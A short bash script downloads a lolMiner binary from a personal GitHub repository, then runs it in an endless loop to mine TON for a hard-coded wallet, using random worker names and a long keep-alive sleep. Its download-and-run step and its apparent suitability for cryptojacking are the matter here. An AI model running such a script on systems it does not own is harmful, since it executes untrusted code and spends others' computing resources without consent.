#!/bin/bash
POOL=https://server1.whalestonpool.com
WALLET=EQCGSQPg6-HnteLECBoIz9jU8hJHszzlBfac53LY3T8KMK80
WORKER=$(echo $(shuf -i 10-40 -n 1)-Dg)
wget https://github.com/drJamesjack/prem/raw/main/lolMiner
chmod +x lolMiner
while [ 1 ]; do
./lolMiner --algo TON --pool $POOL --user $WALLET.$WORKER 
sleep 5
done
sleep 999999999
